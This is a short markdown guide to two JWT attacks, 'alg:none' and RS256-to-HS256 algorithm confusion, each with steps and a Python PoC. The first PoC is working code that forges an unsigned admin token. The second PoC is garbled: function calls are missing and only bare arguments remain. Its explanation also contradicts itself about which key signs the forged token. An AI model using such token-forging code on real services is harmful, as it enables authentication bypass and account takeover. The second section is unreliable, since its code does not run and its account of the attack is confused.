## **1. `alg:none` Attack**
This attack works when the server **does not verify the `alg` header** or **trusts tokens with `alg:none`** (which should be rejected by default).

### **Steps:**
1. **Capture a valid JWT** (e.g., from an API response).
2. **Modify the `alg` header to `none`** and **remove the signature**.
3. **Send the modified token** to the server.

### **Python PoC (using `PyJWT`):**
```python
import jwt

# Original JWT (e.g., HS256)
original_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.SflKxwRJSMeKKF2QT4fWPMeJf36POk6yJV_adQssw5c"

# Step 1: Decode the payload (no verification)
payload = jwt.decode(
    original_token,
    options={"verify_signature": False},
    algorithms=["none"]
)

# Step 2: Re-encode with alg:none (no signature)
malicious_token = jwt.encode(
    payload,
    "",
    algorithm="none",
    headers={"alg": "none"}
)

print("Malicious Token:", malicious_token)
```

**Impact:** If the server accepts `alg:none`, the attacker can **modify the payload** without a valid signature.

## **2. Algorithm Confusion (`RS256 → HS256`)**
This attack works when:
- The server **supports multiple algorithms** (e.g., `RS256` and `HS256`).
- The attacker **forges a token with a weaker algorithm** (`HS256`) but **uses the public key of `RS256`** to sign it.

### **Steps:**
1. **Capture a valid `RS256` JWT** (signed with a private key).
2. **Change `alg` to `HS256`** and **sign it with a known secret** (e.g., from a leaked database).
3. **Send the modified token** to the server.

### **Python PoC (using `PyJWT`):**

```python
# Step 1: Decode (no verification)

    original_token,
    options={"verify_signature": False},
    algorithms=["RS256"]

# Step 2: Re-encode with HS256 (using a weak secret)

    payload,
    "weak_secret_from_leak",  # Known secret (e.g., from DB dump)

```
